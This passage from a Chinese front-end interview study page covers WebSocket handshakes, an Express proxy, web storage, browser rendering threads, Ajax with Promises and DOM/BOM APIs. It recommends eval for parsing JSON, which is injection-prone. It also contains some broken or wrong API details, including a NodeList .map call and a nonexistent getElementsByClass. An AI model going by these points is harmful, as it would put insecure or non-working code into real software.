        <span class="token keyword">proxy_set_header</span>   X<span class="token operator">-</span>Scheme         <span class="token variable">$scheme</span><span class="token punctuation">;</span>      <span class="token comment"># 传递协议</span>
        <span class="token keyword">proxy_set_header</span>   X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For  <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h5 id="websocket通讯"><a href="#websocket通讯" class="header-anchor">#</a> <strong>websocket通讯</strong></h5> <p>原理：当客户端要和服务端建立 WebSocket 连接时，在客户端和服务器的握手过程中，<strong>客户端首先会向服务端发送一个 HTTP 请求，包含一个 Upgrade 请求头来告知服务端客户端想要建立一个 WebSocket 连接</strong>。</p> <p>协议标识：</p> <p>该响应代码101<strong>表示本次连接的HTTP协议即将被更改，更改后的协议就是Upgrade: websocket指定的WebSocket协议。</strong></p> <ul><li>WebSocket是基于Http协议的，或者说借用了Http协议来完成一部分握手，在握手阶段与Http是相同的。我们来看一个websocket握手协议的实现，基本是2个属性，upgrade，connection。</li></ul> <p>基本请求如下：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token request-line"><span class="token property">GET</span> /chat HTTP/1.1</span>
<span class="token header-name keyword">Host:</span> server.example.com
<span class="token header-name keyword">Upgrade:</span> websocket
<span class="token header-name keyword">Connection:</span> Upgrade
<span class="token header-name keyword">Sec-WebSocket-Key:</span> x3JJHMbDL1EzLkh9GBhXDw==
<span class="token header-name keyword">Sec-WebSocket-Protocol:</span> chat, superchat
<span class="token header-name keyword">Sec-WebSocket-Version:</span> 13
<span class="token header-name keyword">Origin:</span> http://example.com
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>多了下面2个属性：</p> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token header-name keyword">Upgrade:</span>webSocket
<span class="token header-name keyword">Connection:</span>Upgrade
告诉服务器发送的是websocket
<span class="token header-name keyword">Sec-WebSocket-Key:</span> x3JJHMbDL1EzLkh9GBhXDw==
<span class="token header-name keyword">Sec-WebSocket-Protocol:</span> chat, superchat
<span class="token header-name keyword">Sec-WebSocket-Version:</span> 13
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p><strong>连接优化/断开重连机制；</strong></p> <p>详见后面详细介绍；</p> <h5 id="nodejs代理"><a href="#nodejs代理" class="header-anchor">#</a> nodejs代理</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> createProxyMiddleware <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http-proxy-middleware'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span> proxyApi<span class="token punctuation">,</span> targetApi <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'./app/conf'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

exports<span class="token punctuation">.</span><span class="token function-variable function">startServer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">port<span class="token punctuation">,</span> path<span class="token punctuation">,</span> callback</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
  app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>proxyApi<span class="token punctuation">,</span> <span class="token function">createProxyMiddleware</span><span class="token punctuation">(</span><span class="token punctuation">{</span> target<span class="token operator">:</span> targetApi<span class="token punctuation">,</span> changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> ws<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">app listening on http://localhost:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>port<span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><h3 id="_5-存储storage-cookie"><a href="#_5-存储storage-cookie" class="header-anchor">#</a> 5:存储storage/cookie</h3> <h4 id="比较区别"><a href="#比较区别" class="header-anchor">#</a> 比较区别</h4> <p><strong>sessionStorage, localStorage, cookies区别</strong></p> <table><thead><tr><th style="text-align:center;">名称</th> <th style="text-align:center;">生命期</th> <th style="text-align:center;">大小限制</th> <th style="text-align:center;">与服务器通信</th></tr></thead> <tbody><tr><td style="text-align:center;">sessionStorage</td> <td style="text-align:center;">仅在当前会话下有效，关闭页面或浏览器后被清除</td> <td style="text-align:center;">5MB</td> <td style="text-align:center;">仅在浏览器中保存，不与服务器通信</td></tr> <tr><td style="text-align:center;">localStorage</td> <td style="text-align:center;"><strong>除非被清除，否则永久保存</strong></td> <td style="text-align:center;">5MB</td> <td style="text-align:center;">仅在浏览器中保存，不与服务器通信</td></tr> <tr><td style="text-align:center;">cookie</td> <td style="text-align:center;"><strong>一般由服务器生成，可设置失效时间</strong>。如果在浏览器端生成Cookie，默认是关闭浏览器后失效</td> <td style="text-align:center;">4KB</td> <td style="text-align:center;"><strong>每次都会携带在HTTP头中</strong>，如果使用cookie保存过多数据会带来性能问题</td></tr></tbody></table> <h4 id="引申到http缓存"><a href="#引申到http缓存" class="header-anchor">#</a> 引申到http缓存</h4> <h3 id="_6-浏览器相关"><a href="#_6-浏览器相关" class="header-anchor">#</a> 6:浏览器相关</h3> <h4 id="常见浏览器及其内核"><a href="#常见浏览器及其内核" class="header-anchor">#</a> 常见浏览器及其内核</h4> <table><thead><tr><th></th> <th>Chrome</th> <th>Firefox</th> <th>Safari</th> <th>IE,TT, 360</th> <th>Opera</th></tr></thead> <tbody><tr><td>内核</td> <td>Blink(WebKit的分支)</td> <td>Gecko</td> <td>Webkit</td> <td>Trident</td> <td>原为：Presto，现为：Blink</td></tr> <tr><td>JS 引擎</td> <td>V8</td> <td>SpiderMonkey</td> <td>Nitro</td> <td>Chakra</td> <td>V8</td></tr></tbody></table> <h4 id="浏览器内核的理解"><a href="#浏览器内核的理解" class="header-anchor">#</a> 浏览器内核的理解</h4> <p>渲染引擎和JS引擎</p> <ul><li><strong>渲染引擎</strong>：负责取得网页的内容、整理讯息，以及计算网页的显示方式</li> <li><strong>JS引擎</strong>：解析和执行js来实现网页的动态效果</li></ul> <p><strong>主要分成两部分</strong>：渲染引擎(layout engineer或Rendering Engine) 和 JS引擎</p> <p>最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，<strong>内核就倾向于只指渲染引擎</strong>进程和线程的区别</p> <ul><li>进程可以看做独立应用，线程不能</li> <li>资源：进程是资源分配的基本单位，线程共享所属进程的资源。进程有独立的地址空间，互不影响，线程只是进程的不同执行路径，某个线程挂了其所在的进程也会挂掉（所以多进程程序会比多线程程序更加健壮）。线程没有独立的地址空间。</li> <li>通信方面：线程间可以通过直接共享同一进程中的资源，而进程通信需要借助 进程间通信。</li> <li>调度：进程切换比线程切换的开销要大。线程是CPU调度的基本单位，线程的切换不会引起进程切换，但某个进程中的线程切换到另一个进程中的线程时，会引起进程切换。</li> <li>系统开销：由于创建或撤销进程时，系统都要为之分配或回收资源，如内存、I/O 等，其开销远大于创建或撤销线程时的开销。同理，在进行进程切换时，涉及当前执行进程 CPU 环境还有各种各样状态的保存及新调度进程状态的设置，而线程切换时只需保存和设置少量寄存器内容，开销较小</li></ul> <h4 id="浏览器渲染进程的线程"><a href="#浏览器渲染进程的线程" class="header-anchor">#</a> 浏览器渲染进程的线程</h4> <p>浏览器的渲染进程的线程总共有五种： <img src="/rat-summ/assets/img/56f0b36edfaa4d8a862dd173c311dd24~tplv-k3u1fbpfcp-zoom-1.b360f2fe.png" alt="img"> <strong>（1）GUI渲染线程</strong></p> <ul><li>负责渲染浏览器页面，解析HTML、CSS，构建DOM树、CSSOM树、渲染树和绘制页面</li> <li>当界面需要<strong>重绘</strong>或由于某种操作引发<strong>回流</strong>时，该线程就会执行</li></ul> <p>注意：GUI渲染线程和JS引擎线程是互斥的，当JS引擎执行时GUI线程会被挂起，GUI更新会被保存在一个队列中等到JS引擎空闲时立即被执行。</p> <p><strong>（2）JS引擎线程</strong></p> <ul><li>JS引擎线程也称为JS内核，负责处理Javascript脚本程序，解析Javascript脚本，运行代码；</li> <li>JS引擎线程一直等待着任务队列中任务的到来，然后加以处理，一个Tab页中无论什么时候都只有一个JS引擎线程在运行JS程序；</li></ul> <p>注意：GUI渲染线程与JS引擎线程的互斥关系，所以如果JS执行的时间过长，会造成页面的渲染不连贯，导致页面渲染加载阻塞。</p> <p><strong>（3）时间触发线程</strong></p> <ul><li>属于浏览器而不是JS引擎，用来控制事件循环；</li> <li>当JS引擎执行代码块如setTimeOut时（也可是来自浏览器内核的其他线程,如鼠标点击、AJAX异步请求等），会将对应任务添加到事件触发线程中；</li> <li>当对应的事件符合触发条件被触发时，该线程会把事件添加到待处理队列的队尾，等待JS引擎的处理；</li></ul> <p>注意：由于JS的单线程关系，所以这些待处理队列中的事件都得排队等待JS引擎处理（当JS引擎空闲时才会去执行）；</p> <p><strong>（4）定时器触发进程</strong></p> <ul><li>即setInterval与setTimeout所在线程；</li> <li>浏览器定时计数器并不是由JS引擎计数的，因为JS引擎是单线程的，如果处于阻塞线程状态就会影响记计时的准确性；</li> <li>因此使用单独线程来计时并触发定时器，计时完毕后，添加到事件队列中，等待JS引擎空闲后执行，所以定时器中的任务在设定的时间点不一定能够准时执行，定时器只是在指定时间点将任务添加到事件队列中；</li></ul> <p>注意：W3C在HTML标准中规定，定时器的定时时间不能小于4ms，如果是小于4ms，则默认为4ms。</p> <p><strong>（5）异步http请求线程</strong></p> <ul><li>XMLHttpRequest连接后通过浏览器新开一个线程请求；</li> <li>检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将回调函数放入事件队列中，等待JS引擎空闲后执行；</li></ul> <h4 id="浏览器解析渲染页面"><a href="#浏览器解析渲染页面" class="header-anchor">#</a> 浏览器解析渲染页面</h4> <p>浏览器拿到响应文本 HTML 后，接下来介绍下浏览器渲染机制</p> <p><img src="/rat-summ/assets/img/webkitflow.b2b7c07b.png" alt="Webkit main flow"></p> <p><img src="/rat-summ/assets/img/afbc340eea4e4edfb84cf2245b960ad9~tplv-k3u1fbpfcp-watermark.f88d5390.png" alt="image.png"></p> <p>览器解析渲染页面分为一下五个步骤：<strong>【DCJ渲布绘】</strong></p> <ul><li>根据 HTML 解析出 <strong>DOM 树</strong></li> <li>根据 CSS 解析生成 <strong>CSS 规则树</strong></li> <li><strong>结合 DOM 树和 CSS 规则树，生成渲染树</strong></li> <li>根据渲染树计算每一个节点的信息</li> <li>根据计算好的信息绘制页面</li></ul> <blockquote><h4 id="为什么css放在顶部而js写在后面"><a href="#为什么css放在顶部而js写在后面" class="header-anchor">#</a> 为什么css放在顶部而js写在后面？</h4></blockquote> <ol><li>浏览器预先加载css后，可以不必等待HTML加载完毕就可以渲染页面了</li> <li>其实HTML渲染并不会等到完全加载完在渲染页面，而<strong>是一边解析DOM一边渲染</strong>。</li> <li>js写在尾部，主要是<strong>因为js主要扮演事件处理的功能</strong>，一方面<strong>很多操作是在页面渲染后才执行的</strong>。另一方面可<strong>以节省加载时间，使页面能够更加的加载，提高用户的良好体验</strong></li> <li>但是随着JS技术的发展，JS也开始承担页面渲染的工作。比如我们的UI其实可以分被对待，把渲染页面的js放在前面，时间处理的js放在后面</li></ol> <blockquote><h4 id="减少reflow、repaint触发优化"><a href="#减少reflow、repaint触发优化" class="header-anchor">#</a> 减少reflow、repaint触发优化</h4></blockquote> <ul><li>用transform做形变和位移可以减少reflow</li> <li>避免逐个修改节点样式，尽量一次性修改</li> <li>使用DocumentFragment将需要多次修改的DOM元素缓存，最后一次性append到真实DOM中渲染</li> <li>可以将需要多次修改的DOM元素设置display:none，操作完再显示。（因为隐藏- - 元素不在render树内，因此修改隐藏元素不会触发回流重绘）</li> <li>避免多次读取某些属性</li> <li>通过绝对位移将复杂的节点元素脱离文档流，形成新的Render Layer，降低回流成本</li></ul> <h4 id="浏览器内核-渲染进程-中线程之间的关系"><a href="#浏览器内核-渲染进程-中线程之间的关系" class="header-anchor">#</a> 浏览器内核（渲染进程）中线程之间的关系</h4> <p><img src="/rat-summ/assets/img/1221105b7c424920bb51bad0e8139743~tplv-k3u1fbpfcp-watermark.2af625dd.png" alt="image.png"></p> <blockquote><p>为了防止渲染出现不可预期的结果，GUI线程和JS引擎线程互斥</p></blockquote> <p>js是可以操作dom的，如果修改时，在GUI正在渲染，这个时候GUI线程会被挂起，保存在一个队列中，等待js引擎空闲时立即被执行</p> <p><strong>问：CSS加载会阻塞DOM树的解析，渲染吗？</strong> <em>这里说的是头部引入css的情况</em></p> <p>答：根据上面的流程图可以看到，dom树和cssom是互相解析的，但是在生成render树的时候，需要等待css解析完，所以<code>CSS加载不会阻塞DOM树的解析，但是会阻塞DOM树的渲染</code>。</p> <p><strong>问：CSS和JS会互相阻塞吗？</strong></p> <p>答：因为GUI线程和JS引擎线程互斥，我们可以分别尝试分别把js和css放在上面</p> <ol><li>script标签在style上面使用alert语句，页面不加载，阻塞了css解析</li> <li>style在面，使用慢网速加载cdn的css样式，样式展示前，js不执行，阻塞了js的执行</li></ol> <p>结论，CSS加载会阻塞后面JS语句的执行，所以在开始学习前端时，会建议大家将script标签放在body之后，防止影响页面渲染。</p> <h3 id="_7-json-ajax"><a href="#_7-json-ajax" class="header-anchor">#</a> 7:Json/Ajax</h3> <h4 id="json对象与字符串互转"><a href="#json对象与字符串互转" class="header-anchor">#</a> JSON对象与字符串互转</h4> <blockquote><p><strong>序列化及反序列化</strong></p></blockquote> <p><strong>JSON字符串转换为JSON对象</strong>：</p> <ul><li>var obj = JSON.parse(str);</li> <li>var obj = eval('('+ str +')');</li></ul> <p><strong>JSON对象转换为JSON字符串</strong>：</p> <ul><li>var last=JSON.stringify(obj);</li></ul> <h4 id="创建一个ajax的流程"><a href="#创建一个ajax的流程" class="header-anchor">#</a> 创建一个Ajax的流程</h4> <ol><li>创建XMLHttpRequest对象,也就是创建一个异步调用对象</li> <li>创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息</li> <li>设置响应HTTP请求状态变化的函数</li> <li>发送HTTP请求</li> <li>获取异步调用返回的数据</li> <li>使用JavaScript和DOM实现局部刷新</li></ol> <h4 id="解决浏览器缓存问题"><a href="#解决浏览器缓存问题" class="header-anchor">#</a> 解决浏览器缓存问题</h4> <ul><li>在ajax发送请求前加上 <strong>anyAjaxObj.setRequestHeader(&quot;If-Modified-Since&quot;,&quot;0&quot;)。</strong></li> <li>在ajax发送请求前加上 <strong>anyAjaxObj.setRequestHeader(&quot;Cache-Control&quot;,&quot;no-store&quot;)。</strong></li> <li>在URL后面<strong>加上一个随机数</strong>： &quot;fresh=&quot; + Math.random();。</li> <li>在URL后面<strong>加上时间戳</strong>：&quot;nowtime=&quot; + new Date().getTime();。</li> <li>如果是使用jQuery，直接这样就可以了 <strong>$.ajaxSetup({cache:false})</strong>。这样页面的所有ajax都会执行这条语句就是不需要保存缓存记录。</li></ul> <h4 id="使用promise封装ajax"><a href="#使用promise封装ajax" class="header-anchor">#</a> 使用Promise封装AJAX</h4> <p><strong>ajax的优缺点</strong></p> <p>优点：减轻服务器的负担，按需取数据，最大程度减少冗余请求，局部刷新。
缺点：浏览器之间有差异，对流媒体和移动设备支持不够好;</p> <div class="language-javascript line-numbers-mode"><pre class="language-javascript"><code><span class="token comment">// promise 封装实现：</span>
<span class="token keyword">function</span> <span class="token function">getJSON</span><span class="token punctuation">(</span><span class="token parameter">url</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">// 创建一个 promise 对象</span>
  <span class="token keyword">let</span> promise <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">let</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 新建一个 http 请求</span>
    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;GET&quot;</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置状态的监听函数</span>
    xhr<span class="token punctuation">.</span><span class="token function-variable function">onreadystatechange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>readyState <span class="token operator">!==</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>
      <span class="token comment">// 当请求成功或失败时，改变 promise 的状态</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">===</span> <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置错误监听函数</span>
    xhr<span class="token punctuation">.</span><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>statusText<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置响应的数据类型</span>
    xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">&quot;json&quot;</span><span class="token punctuation">;</span>
    <span class="token comment">// 设置请求头信息</span>
    xhr<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">&quot;Accept&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;application/json&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 发送 http 请求</span>
    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> promise<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><blockquote><h4 id="ajax、axios、fetch有啥区别"><a href="#ajax、axios、fetch有啥区别" class="header-anchor">#</a> Ajax、Axios、Fetch有啥区别？</h4></blockquote> <ul><li>Ajax：是对XMLHttpRequest对象（XHR）的封装；</li> <li>Axios：是基于Promise对XHR对象的封装；</li> <li>Fetch：是window的一个方法，也是基于Promise，但是与XHR无关，不支持IE，可通过第三方库支持；</li></ul> <h3 id="_8-bom-dom-事件"><a href="#_8-bom-dom-事件" class="header-anchor">#</a> 8:BOM/DOM/事件</h3> <p>BOM（<strong>浏览器对象模型</strong>）是浏览器本身的一些信息的设置和获取，例如获取浏览器的宽度、高度，设置让浏览器跳转到哪个地址。</p> <ul><li>window.screen对象：包含有关用户屏幕的信息</li> <li>window.location对象：用于获得当前页面的地址(URL)，并把浏览器重定向到新的页面</li> <li>window.history对象：浏览历史的前进后退等</li> <li>window.navigator对象：常常用来获取浏览器信息、是否移动端访问等等</li></ul> <p>BOM就是<code>browser object model</code>，<code>浏览器对象模型</code></p> <table><thead><tr><th>api</th> <th>作用                 ——————————</th> <th>代表方法或属性</th></tr></thead> <tbody><tr><td>window.history</td> <td>操纵浏览器的记录</td> <td>history.back() history.go(-1)</td></tr> <tr><td>window.innerHeight</td> <td>获取浏览器窗口的高度</td> <td></td></tr> <tr><td>window.innerWidth</td> <td>获取浏览器窗口的宽度</td> <td></td></tr> <tr><td>window.location</td> <td>操作刷新按钮和地址栏</td> <td>location.host：获取域名和端口 location.hostname：获取主机名 location.port：获取端口号 location.pathname：获取url的路径 location.search：获取?开始的部分 location.href：获取整个url location.hash：获取#开始的部分 location.origin：获取当前域名 location.navigator：获取当前浏览器信息</td></tr></tbody></table> <h4 id="dom与bom的区别"><a href="#dom与bom的区别" class="header-anchor">#</a> DOM与BOM的区别</h4> <ul><li>文档对象类型(DOM)：把整个页面规划成由节点层级构成的文档</li> <li>浏览器对象模型(BOM)：处理浏览器宽口和框架</li></ul> <p>可以说，<strong>BOM包含了DOM(对象)，浏览器提供出来给予访问的是BOM对象，从BOM对象再访问到DOM对象，从而js可以操作浏览器以及浏览器读取到的文档。</strong></p> <h4 id="文档碎片"><a href="#文档碎片" class="header-anchor">#</a> 文档碎片</h4> <p>一个容器，用于暂时存放创建的dom元素，使用<code>document.createDocumentFragment()</code>创建；</p> <h5 id="作用"><a href="#作用" class="header-anchor">#</a> 作用</h5> <p>将需要添加的大量元素 先添加到文档碎片 中，再将文档碎片添加到需要插入的位置，<strong>大大减少dom操作，提高性能</strong>；</p> <h5 id="案例"><a href="#案例" class="header-anchor">#</a> 案例</h5> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> docFra <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createDocumentFragment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10000</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span> 
    <span class="token keyword">var</span> op <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">&quot;span&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">var</span> oText <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createTextNode</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    op<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>oText<span class="token punctuation">)</span><span class="token punctuation">;</span> 
    docFra<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//先附加在文档碎片中 </span>
<span class="token punctuation">}</span> 
document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>docFra<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//最后一次性添加到document中</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h4 id="dom常用操作"><a href="#dom常用操作" class="header-anchor">#</a> DOM常用操作</h4> <p><strong>创建新节点</strong></p> <ul><li>createDocumentFragment()    //创建一个DOM片段</li> <li>createElement()   //创建一个具体的元素</li> <li>createTextNode()   //创建一个文本节点</li></ul> <p><strong>添加、移除、替换、插入</strong></p> <ul><li>appendChild()</li> <li>removeChild()</li> <li>replaceChild()</li> <li>insertBefore() //在已有的子节点前插入一个新的子节点</li></ul> <p><strong>查找</strong></p> <ul><li>getElementsByTagName()    //通过标签名称</li> <li>getElementsByName()    //通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的)</li> <li>getElementById()    //通过元素Id，唯一性;</li></ul> <h4 id="访问html元素的不同方式"><a href="#访问html元素的不同方式" class="header-anchor">#</a> 访问HTML元素的不同方式</h4> <ul><li><strong>getElementById(‘idname’)</strong>: 按<code>id</code>名称获取元素</li> <li><strong>getElementsByClass(‘classname’)</strong>: 获取具有给定类名的所有元素</li> <li><strong>getElementsByTagName(‘tagname’)</strong>: 获取具有给定标记名称的所有元素</li> <li><strong>querySelector()</strong>: 此函数<em>采用css样式选择器并返回第一个选定元素</em></li></ul> <blockquote><h4 id="获取dom元素有哪些方法"><a href="#获取dom元素有哪些方法" class="header-anchor">#</a> 获取DOM元素有哪些方法</h4></blockquote> <table><thead><tr><th>方法</th> <th>描述</th> <th>返回类型</th></tr></thead> <tbody><tr><td>document.getElementById(id)</td> <td>通过id获取dom</td> <td>符合条件的dom对象</td></tr> <tr><td>document.getElementsByTagName(tagName)</td> <td>通过标签名获取dom</td> <td>符合条件的所有dom对象组成的类数组</td></tr> <tr><td>document.getElementsByClassName(class)</td> <td>通过class获取dom</td> <td>符合条件的所有dom对象组成的类数组</td></tr> <tr><td>document.getElementsByName(name)</td> <td>通过标签的属性name获取dom</td> <td>符合条件的所有dom对象组成的类数组</td></tr> <tr><td>document.querySelector(选择器)</td> <td>通过选择器获取dom</td> <td>符合条件的第一个dom对象</td></tr> <tr><td>document.querySelectorAll(选择器)</td> <td>通过选择器获取dom</td> <td>符合条件的所有dom对象组成的类数组</td></tr></tbody></table> <p>比如：</p> <ul><li>获取所有的DOM节点；<code>document.querySelectorAll('*')</code>；</li> <li>统计网⻚上出现了多少种标签：<code>new Set([...document.querySelectorAll('*').map(ele=&gt;ele.tagName)).size</code></li></ul> <h4 id="专用名词区别"><a href="#专用名词区别" class="header-anchor">#</a> 专用名词区别</h4> <h5 id="window-与-document的区别"><a href="#window-与-document的区别" class="header-anchor">#</a> <strong>window 与 document的区别</strong></h5> <ul><li><p><strong>window</strong>:JS 的 window 是一个全局对象，它包含变量、函数、<code>history</code>、<code>location</code>。</p></li> <li><p><strong>document</strong>:<code>document</code>也位于<code>window</code>之下，<strong>可以视为<code>window</code>的属性</strong>。</p></li></ul> <h5 id="innerhtml-和-innertext的区别"><a 